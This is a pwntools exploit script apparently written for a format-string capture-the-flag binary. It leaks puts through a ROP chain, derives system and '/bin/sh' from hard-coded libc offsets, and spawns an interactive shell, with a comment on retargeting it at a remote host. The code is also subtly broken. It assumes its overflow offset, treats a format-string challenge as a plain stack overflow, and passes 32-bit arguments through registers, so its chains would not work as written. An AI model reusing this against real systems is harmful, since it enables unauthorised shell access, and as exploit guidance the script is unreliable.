from pwn import *

# Set up the context for the binary
context.binary = './pwn/string/fmt-5/fmt5'
context.arch = 'i386'
context.log_level = 'debug'

# Load the binary
elf = context.binary
def exploit():
    # Start a process or connect to remote if needed
    p = process()
    # If you are attacking a remote service, use:
    # p = remote('remote_host', port)

    # Find the offset to control EIP
    # This part is usually done through fuzzing and analyzing the crash
    # For demonstration, let's assume the offset is 64 bytes
    offset = 64

    # Create a ROP object
    rop = ROP(elf)

    # Find the gadgets
    pop_ebx = rop.find_gadget(['pop ebx', 'ret']).address
    pop_esi_edi_ebp = rop.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret']).address
    ret = rop.find_gadget(['ret']).address

    # Find the address of the PLT entries
    printf_plt = elf.plt['printf']
    puts_plt = elf.plt['puts']

    # Find the address of the GOT entries
    got_puts = elf.got['puts']

    # Leak a libc address
    # We will leak the address of 'puts' to calculate the base address of libc
    payload = b"A" * offset
    payload += p32(pop_ebx)
    payload += p32(got_puts)
    payload += p32(printf_plt)
    payload += p32(elf.symbols['main'])  # Return to main to keep the process alive

    # Send the payload to leak the address
    p.sendline(payload)
    p.recvuntil(b'\n')
    leaked_puts = u32(p.recv(4))

    # Calculate the base address of libc
    libc_base = leaked_puts - 0x05f140  # Offset for 'puts' in libc 2.23 (may vary)
    log.info(f'Leaked puts: {hex(leaked_puts)}')
    log.info(f'Libc base: {hex(libc_base)}')

    # Find the system and "/bin/sh" addresses in libc
    system_addr = libc_base + 0x03a940  # Offset for 'system' in libc 2.23 (may vary)
    bin_sh_addr = libc_base + 0x158e8b  # Offset for '/bin/sh' in libc 2.23 (may vary)

    # Construct the final payload to spawn a shell
    payload = b"A" * offset
    payload += p32(pop_ebx)
    payload += p32(bin_sh_addr)
    payload += p32(system_addr)

    # Send the final payload
    p.sendline(payload)

    # Switch to interactive mode to interact with the shell
    p.interactive()

if __name__ == '__main__':
    exploit()
